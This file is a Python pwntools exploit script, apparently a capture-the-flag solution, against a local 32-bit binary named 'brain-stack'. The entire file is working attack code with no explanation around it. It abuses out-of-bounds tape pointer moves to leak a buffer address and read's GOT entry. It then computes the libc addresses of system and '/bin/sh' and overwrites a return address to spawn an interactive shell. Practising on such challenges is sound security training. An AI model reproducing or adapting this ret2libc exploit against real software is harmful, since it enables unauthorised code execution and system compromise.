#!/usr/bin/env python
# coding=utf-8
from pwn import * 
p=process('./brain-stack')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#context.log_level='debug'
tape=0x2040
cmd=0x203c
tape_ptr=0x2038
read_got_addr=0x200c
#leak buffer address
p.recvuntil('>')
for i in range(tape-cmd):
    p.sendline('<')
    p.recv()
p.sendline('R')
data=''
data=p.recv(2)+data
data=p.recv(2)+data
data=p.recv(2)+data
data=p.recv(2)+data
buffer_addr=int(data,16)
print "buffer address ===> "+hex(buffer_addr)
#leak read,system, /bin/sh address 
p.recvuntil('>')
for i in range(cmd-read_got_addr):
    p.sendline('<')
    p.recv()
p.sendline('R')
data=''
data=p.recv(2)+data
data=p.recv(2)+data
data=p.recv(2)+data
data=p.recv(2)+data
read_addr=int(data,16)
print "read address ===> "+hex(read_addr)
system=libc.symbols['system']-libc.symbols['read']+read_addr
binsh=next(libc.search('/bin/sh'))-libc.symbols['read']+read_addr
print "system address ===> "+hex(system)
print "/bin/sh address ===> "+hex(binsh)
#overwrite return address
p.recvuntil('>')
for i in range(tape_ptr-read_got_addr):
    p.sendline('>')
    p.recv()
p.sendline('W')
p.sendline(p32(buffer_addr+9+4))
p.recvuntil('>')
p.sendline('W')
p.sendline(p32(system))
p.recvuntil('>')
for i in range(4):
    p.sendline('>')
    p.recv()
p.sendline('W')
p.sendline('aaaa')
p.recvuntil('>')
for i in range(4):
    p.sendline('>')
    p.recv()
p.sendline('W')
p.sendline(p32(binsh))
p.recvuntil('>')
p.sendline('a')
p.interactive()